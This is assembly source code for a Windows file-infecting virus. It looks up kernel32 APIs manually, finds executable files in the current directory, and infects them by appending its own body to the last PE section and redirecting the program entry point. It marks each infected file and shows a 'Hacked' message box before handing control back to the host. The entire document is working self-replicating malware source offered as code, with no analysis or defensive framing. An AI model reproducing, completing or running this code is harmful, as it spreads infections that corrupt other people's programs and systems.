.386p
.model flat, stdcall
option casemap:none


.data

.code
VirusStart:
	call	delta
delta:
	pop ebp
	sub ebp, offset delta
	mov eax, total_size	
	mov esi, [esp]
	and esi, 0FFFF0000h

	call GetK32	
	mov dword ptr [ebp+offset aKernel32], eax	;save kernel32.dll
	
	lea edi, [ebp+offset @@Offsetz]
	lea esi, [ebp+offset @@Namez]
	call GetApis
	call SpecialApi
	call DirScan
	call MessageBoxHacked


;------------------------------------------------------------------------
; MESSAGE BOX
;------------------------------------------------------------------------
MessageBoxHacked PROC
	push ebp
	push		0
	mov eax, offset szTopic
	add eax, ebp
	push eax
	mov eax, offset szText
	add eax, ebp
	push eax
	push 0
	mov eax, dword ptr [ebp+offset aMessageBoxA]
	call eax
	pop ebp
;-------------------------------------------------------------------------
	mov ecx, dword ptr [ebp+offset TEST1]
	add ebp, offset delta
	sub ebp, ecx
	sub ebp, 5
	mov eax, ebp
	jmp eax

MessageBoxHacked endp

DirScan:
	
;	push		128h					;have to set Buffer size > 260
;	lea		eax, [ebp+offset WindowsDir]		;retrieve the path of Windows
;								;Directory
;	push		eax
;	mov		eax, dword ptr [ebp+offset aGetWindowsDirectoryA]
;	call		eax
;				
;	push		128h					;buffer size > 260
;	lea		eax, [ebp+offset SystemDir]		;retrieve the path of System 
;	push		eax					;directory
;	mov		eax, [ebp+offset aGetSystemDirectoryA]
;	call		eax
;				
	lea eax, [ebp+offset CurrentDir]		;retrieve the path of Current
	push eax					;directory
	push 128h					;buffer size > 260
	mov eax, [ebp+offset aGetCurrentDirectoryA]
	call eax
		
;	lea		eax, [ebp+offset WindowsDir]
;	push		eax
;	mov		eax, [ebp+offset aSetCurrentDirectoryA]
;	call		eax
;	mov		dword ptr [ebp+offset Counter], 3
;	call		SearchFiles				;start searching the target files
;	
;	lea		eax, [ebp+offset SystemDir]
;	push		eax
;	mov		eax, [ebp+offset aSetCurrentDirectoryA]
;	call		eax
;	mov		dword ptr [ebp+offset Counter], 3
;	call		SearchFiles
;	
	lea eax, [ebp+offset CurrentDir]
	push eax
	mov eax, [ebp+offset aSetCurrentDirectoryA]
	call eax
	mov dword ptr [ebp+offset Counter], 3
	call SearchFiles
	
	ret

;-------------------------------------------------------------------------------
; Search 3 files
;-------------------------------------------------------------------------------
SearchFiles:
	push ebp						;save ebp
	lea eax, dword ptr [ebp+offset Win32FindData]	;load the Win32_Find_Data structure
	push eax
	lea eax, [ebp+offset Mark]				;search *.exe
	push eax
	call [ebp+offset aFindFirstFileA]
	pop ebp
	
	inc eax						;check with eax=FFFFFFFF+1
	jz SearchClose					;fail :(
	dec eax						;get the original FileHandle
	mov dword ptr [ebp+offset SearchHandle], eax	;save FileHandle
	mov esi, offset Win32FindData.FileName		;esi=pointer to FileName
	add esi, ebp
	mov dword ptr [ebp+offset FilePointer], esi		;save the Pointer to FileName
	
	cmp [Win32FindData.FileSizeHigh+ebp], 0		;high 32 bits of FileSize
	jne SearchNext					;way too big for us 
	
	mov ecx, [Win32FindData.FileSizeLow+ebp]		;ecx=File Size
	mov dword ptr [ebp+offset NewFileSize], ecx		;NewFileSize will change in InfectFiles 
	mov dword ptr [ebp+offset OriFileSize], ecx 	;routine
	call InfectFiles			
	
	dec dword ptr [ebp+offset Counter]			;Counter - 1
	cmp dword ptr [ebp+offset Counter], 0
	je SearchHandleClose
	
SearchNext:
	push ebp
	lea eax, dword ptr [ebp+offset Win32FindData]
	push eax
	mov eax, dword ptr [ebp+offset SearchHandle]	;eax=Search Handle
	push eax
	call [ebp+offset aFindNextFileA]
	pop ebp
	
	cmp eax, 0						;error?
	je SearchHandleClose				;done
	
	mov esi, offset Win32FindData.FileName
	add esi, ebp
	mov dword ptr [ebp+offset FilePointer], esi		;esi=File Pointer
	
	cmp [Win32FindData.FileSizeHigh+ebp], 0
	jne SearchNext
	
	mov ecx, [Win32FindData.FileSizeLow+ebp]		;ecx=File Size
	mov dword ptr [ebp+offset NewFileSize], ecx	 	;save it
	mov dword ptr [ebp+offset OriFileSize], ecx
	call InfectFiles
	
	dec dword ptr [ebp+offset Counter]			;Counter - 1
	cmp dword ptr [ebp+offset Counter], 0
	jne SearchNext

SearchHandleClose:
	push dword ptr [ebp+offset SearchHandle]
	mov eax, [ebp+offset aFindClose]
	call eax	
	cmp eax, 0
	je SearchClose

SearchClose:
	ret

InfectFiles:	
	pushad   ;save all the register before start infect
															
	mov dword ptr [ebp+offset InfectFlag], 0														
	mov ecx, dword ptr [ebp+offset NewFileSize]
	cmp ecx, MinimumFileSize				;minimum FileSize=400h
	jb JumpOut
	
	add ecx, total_size
	mov dword ptr [ebp+offset NewFileSize], ecx
	
	push ebp
	push dword ptr [ebp+offset FilePointer]
	mov eax, [ebp+offset aGetFileAttributesA]
	call eax
	pop ebp
	mov dword ptr [ebp+offset FileAttribute], eax	;save the original file attribute
	
	push ebp
	push 00000080h					;set file attribute = any
	push dword ptr [ebp+offset FilePointer]
	mov eax, [ebp+offset aSetFileAttributesA]
	call eax
	pop ebp
	
	cmp eax, 0						;error?
	jz ErrorOpenExe
	
	push ebp
	push 0h
	push 00000080h
	push 00000003h
	push 0h
	push 00000001h
	push 80000000h or 40000000h
	push dword ptr [ebp+offset FilePointer]
	mov eax, [ebp+offset aCreateFileA]
	call eax
	pop ebp
	
	inc eax						;if error, eax=0FFFFFFFFh. eax = eax+1
	cmp eax, 0						;error?
	jz ErrorOpenExe
	dec eax
	mov dword ptr [ebp+offset FileHandle], eax		;save the FileHandle
	
	push ebp
	push dword ptr [ebp+offset NewFileSize]
	push 0h
	mov eax, [ebp+offset aGlobalAlloc]
	call eax
	pop ebp
	
	cmp eax, 0h
	jz ErrorBuffer					;error?
	mov dword ptr [ebp+offset MemoryHandle], eax	;save
	
	push ebp
	lea eax, [ebp+offset ByteRead]
	push 0h
	push eax
	push dword ptr [ebp+offset OriFileSize]
	push dword ptr [ebp+offset MemoryHandle]
	push dword ptr [ebp+offset FileHandle]
	mov eax, [ebp+offset aReadFile]
	call eax
	pop ebp
	
	cmp eax, 0h						;error?
	jz ErrorReadExe
	
	push ebp
	push 0h
	push 0h
	push 0h
	push dword ptr [ebp+offset FileHandle]
	mov eax, [ebp+offset aSetFilePointer]
	call eax
	pop ebp
	
	inc eax						;if fail, eax=0FFFFFFFFh. eax = eax+1
	cmp eax, 0h
	jz ErrorReadExe
	
	mov esi, dword ptr [ebp+offset MemoryHandle]
	cmp word ptr [esi], "ZM"
	jnz ErrorReadExe
	
	xor eax, eax					;eax = 0
	mov eax, dword ptr [esi+3ch]			;eax = offset PE Header
	add esi, eax					;esi = point to PE Header
	cmp dword ptr [esi], "EP"				;PE file ?
	jz StartInfect
	mov dword ptr [ebp+offset InfectFlag], 0FFh
	jmp ErrorReadExe
	
StartInfect:
	mov dword ptr [ebp+offset PEHeader], esi
	cmp dword ptr [esi+4ch], "31"			;infected?
	jz InfectError
	mov dword ptr [esi+4ch], "31"			;put the infected symbol
	
	mov ebx, [esi+74h]					;ebx=NumberOfRvaAndSizes
	shl ebx, 3						;ebx=ebx*8
	xor eax, eax					;eax=0
	mov ax, word ptr [esi+06h]				;ax = Number of Sections
	dec eax						;eax=eax-1
	mov ecx, 28h
	mul ecx						;eax=eax*ecx
	add eax, ebx
	add esi, 78h
	add esi, eax					;now esi point to Last Section
	
	mov edi, dword ptr [ebp+offset PEHeader]		;edi=PE Header
	mov eax, [esi+0ch]					;eax= VirtualAddress
	add eax, dword ptr [esi+10h]			;eax = VirtualAddress+SizeOfRawData
	xchg eax, [edi+28h]					;eax = Original AddressOfEntryPoint
	;add eax, [edi+34h]					;eax= Original AddressOfEntryPoint+ImageBase
	
	mov ecx, [edi+28h]
	sub ecx, eax
	mov dword ptr [ebp+offset TEST1], ecx
	
	mov ecx, total_size
	add [esi+08h], ecx					;New VirtualSize= Original VirtualSize+VirusSize
	mov eax, [esi+08h]					;eax = New VirtualSize
	add eax, [esi+0ch]					;eax = New VirtualSize+VirtualAddress
	mov ebx, [edi+38h]             ; ebx = SectionAlignment (found at offset 0x38 in PE header)
	dec ebx                        ; ebx = SectionAlignment - 1
	add eax, ebx                   ; add ebx to ensure alignment
	not ebx
	and eax, ebx               ; clear the lower bits to align to SectionAlignment

	mov [edi+50h], eax             ; eax = aligned SizeOfImage
	
	mov eax, [esi+10h]					;eax=SizeOfRawData
	add [esi+10h], ecx					;New SizeOfRawData= Old SizeOfRawData+VirusSize
	or dword ptr [esi+24h], 0A0000020h
	mov edi, [esi+14h]
	mov ebx, dword ptr [ebp+offset MemoryHandle]
	add edi, ebx
	add edi, eax

	;mov esi, dword ptr [ebp+offset TEST1]
	;add esi, edi
	;mov dword ptr [ebp+offset ORIGINAL], esi

	mov esi, offset VirusStart
	add esi, ebp

	rep movsb

	lea eax, [ebp+offset ByteRead]
	push ebp
	push 0h
	push eax
	push dword ptr [ebp+offset NewFileSize]
	push dword ptr [ebp+offset MemoryHandle]
	push dword ptr [ebp+offset FileHandle]
	mov eax, [ebp+offset aWriteFile]
	call eax
	pop ebp
	
InfectError:
ErrorReadExe:
	push ebp
	push dword ptr [ebp+offset MemoryHandle]
	mov eax, [ebp+offset aGlobalFree]
	call eax
	pop ebp

ErrorBuffer:
	push ebp
	push dword ptr [ebp+offset FileHandle]
	;call aCloseHandle
	mov eax, [ebp+offset aCloseHandle]
	call eax
	pop ebp

ErrorOpenExe:
	push ebp
	push dword ptr [ebp+offset FileAttribute]
	push dword ptr [ebp+offset FilePointer]
	call [ebp+offset aSetFileAttributesA]
	;mov eax, [ebp+offset aSetFileAttributesA]
	;call eax
	pop ebp
	jmp InfectCheck

InfectFail:
	stc
	jmp JumpOut
InfectCheck:
	cmp dword ptr [ebp+offset InfectFlag], 0FFh
	jz InfectFail
	clc

JumpOut:
	popad
	ret
	

		
;----------------------------------------------------------------------------------
;Searching Kernel32.dll address
;----------------------------------------------------------------------------------
GetK32	PROC

ScanK32:
	cmp word ptr [esi], "ZM"		
	je K32Found
	sub esi, 10000h
	jmp ScanK32
	
K32Found:
	mov eax, esi
	ret

GetK32 endp

;------------------------------------------------------------------------------------
;Searching The APIs function 
;edi=API offset
;esi=API name
;------------------------------------------------------------------------------------
GetApis	PROC
@@1:
	mov eax, dword ptr [ebp+aKernel32]
	push esi
	push edi
	call GetApi
	pop edi
	pop esi
									
	mov [edi], eax					;store API address in eax ----> edi
	add edi, 4							
	
@@3:
	inc esi
	cmp byte ptr [esi], 0
	jne @@3
	inc esi
	cmp byte ptr [esi], 0FFh				;ended?
	jnz @@1								
	ret										
GetApis endp

GetApi	PROC
	mov ebx, [eax+3ch]					;ebx=offset PE header
	add ebx, eax					;ebx=point to PE header
	mov ebx, [ebx+78h]					;ebx=point to ExportDirectory Virtual Address
	add ebx, eax					;normalize, ebx=point to ExportDirectory
	
	xor edx, edx					;edx=0
	mov ecx, [ebx+20h]					;ecx=point to AddressOfNames
	add ecx, eax					;normalize
	push esi						;save to stack
	push edx						;save to stack

NextApi:
	pop edx
	pop esi
	inc edx						;edx=the index into AddressOfOrdinals+1
	mov edi, [ecx]					;edi=API function export by Kernel32.dll
	add edi, eax					;normalize
	add ecx, 4						;point to next API function
	push esi						;save to stack
	push edx

CompareApi:
	mov dl, [edi]					;dl=API function export by Kernel32.dll
	mov dh, [esi]					;dh=API function we looking for
	cmp dl, dh						;match?
	jne NextApi						;not match....ok...next API 
	inc edi						;if match, compare next byte
	inc esi								
	cmp byte ptr [esi], 0				;finish?
	je GetAddr						;jmp to get the address of API function
	jmp CompareApi						

GetAddr:
	pop edx
	pop esi
	dec edx						;edx-1 (because edx=index point to zero -finish)
	shl edx, 1						;edx=edx*2
	
	mov ecx, [ebx+24h]
	add ecx, eax
	add ecx, edx					;ecx=ordinals
	
	xor edx,edx
	mov dx, [ecx]
	shl edx, 2						;edx=edx*4
	mov ecx, [ebx+1ch]					;ecx=RVA AddressOfFunctions
	add ecx, eax					;normalize
	add ecx, edx						
	add eax, [ecx]					;eax=address of API function we looking for 
	ret
	
GetApi	endp

;-----------------------------------------------------------------------------
;call special API MessageBoxA
;-----------------------------------------------------------------------------
SpecialApi	proc
	mov eax, offset User32Dll
	add eax, ebp
	push eax
	mov eax, dword ptr [ebp+offset aLoadLibraryA]
	call eax
	
	mov esi, offset sMessageBoxA
	add esi, ebp
	push esi
	;mov esi, offset sMessageBoxA
	;push esi
	push eax
	mov eax, dword ptr [ebp+offset aGetProcAddress]
	call eax
	
	
	mov		dword ptr [ebp+offset aMessageBoxA], eax
	ret

SpecialApi endp	

;-----------------------------------------------------------------------------
;APIs function needed.
;-----------------------------------------------------------------------------

sMessageBoxA			db	"MessageBoxA", 0
aMessageBoxA			dd	00000000h


@@Namez				label	byte
sGetProcAddress			db	"GetProcAddress", 0
sLoadLibraryA			db	"LoadLibraryA", 0
sExitProcess			db	"ExitProcess", 0
sGetWindowsDirectoryA		db	"GetWindowsDirectoryA", 0
sGetSystemDirectoryA		db	"GetSystemDirectoryA", 0
sGetCurrentDirectoryA		db	"GetCurrentDirectoryA", 0
sSetCurrentDirectoryA		db	"SetCurrentDirectoryA", 0
sFindFirstFileA			db	"FindFirstFileA", 0
sFindNextFileA			db	"FindNextFileA", 0
sFindClose			db	"FindClose", 0
sGlobalAlloc			db	"GlobalAlloc", 0
sGlobalFree			db	"GlobalFree", 0
sGetFileAttributesA		db	"GetFileAttributesA", 0
sSetFileAttributesA		db	"SetFileAttributesA", 0
sCreatFileA			db	"CreateFileA", 0
sReadFile			db	"ReadFile", 0
sWriteFile			db	"WriteFile", 0
sGetFileTime			db	"GetFileTime",0
sGetFileSize			db	"GetFileSize", 0
sCreateFileMapping		db	"CreateFileMapping", 0
sCloseHandle			db	"CloseHandle", 0
sSetFilePointer			db	"SetFilePointer", 0
sSetEndOfFile			db	"SetEndOfFile", 0
				db	0FFh
										
@@Offsetz			label	byte
aGetProcAddress			dd	00000000h			
aLoadLibraryA			dd	00000000h
aExitProcess			dd	00000000h
aGetWindowsDirectoryA		dd	00000000h
aGetSystemDirectoryA		dd	00000000h
aGetCurrentDirectoryA		dd	00000000h
aSetCurrentDirectoryA		dd	00000000h
aFindFirstFileA			dd	00000000h
aFindNextFileA			dd	00000000h
aFindClose			dd	00000000h
aGlobalAlloc			dd	00000000h
aGlobalFree			dd	00000000h
aGetFileAttributesA		dd	00000000h
aSetFileAttributesA		dd	00000000h
aCreateFileA			dd	00000000h
aReadFile			dd	00000000h
aWriteFile			dd	00000000h
aGetFileTime			dd	00000000h
aGetFileSize			dd	00000000h
aCreateFileMapping		dd	00000000h
aCloseHandle			dd	00000000h
aSetFilePointer			dd	00000000h
aSetEndOfFile			dd	00000000h

;------------------------------------------------------------------------------
;Parameters
;------------------------------------------------------------------------------
aKernel32			dd	00000000h
Counter				dd	00000000h
SearchHandle			dd	00000000h
FileHandle			dd	00000000h
FilePointer			dd	00000000h
OriginalFileTime		dd	00000000h
FileAttribute			dd	00000000h
MemoryHandle			dd	00000000h
NewFileSize			dd	00000000h
PEHeader			dd	00000000h
InfectFlag			dd	00000000h
OriFileSize			dd	00000000h
TEST1				dd 	00000000h
ORIGINAL			dd 	00000000h
ByteRead			dd	?

User32Dll			db	"User32.dll", 0			;User32.dll
WindowsDir			db	128h dup (0)
SystemDir			db	128h dup (0)
CurrentDir              db    128h dup (0)
Mark				db	"*.exe", 0			;target file *.exe

total_size			equ	(offset VirusEnd - offset VirusStart)


szTopic				db	"Hello World", 0
szText				db	"Hacked", 0


max_path			equ	260
MinimumFileSize			equ	1024d

filetime		STRUC						;file time structure
			FT_dwLowDateTime	DD ?	
			FT_dwHighDateTime	DD ?
filetime		ENDS	


win32_find_data                 STRUC             
         FileAttributes          DD ?              			; attributes
         CreationTime            filetime <>        			; time of creation
         LastAccessTime          filetime <>        			; last access time
         LastWriteTime           filetime <>        			; last modificationm
         FileSizeHigh            DD ?              			; filesize
         FileSizeLow             DD ?              			; -"-
         Reserved0               DD ?              			;
         Reserved1               DD ?              			;
         FileName                DB max_path DUP (?) 			; long filename
         AlternateFileName       DB 13 DUP (?)     			; short filename
                                 DB 3 DUP (?)      			; dword padding
 win32_find_data                 ENDS              			;
                                                   			;
 Win32FindData    win32_find_data <>                			; our search area
	
VirusEnd:

end	VirusStart
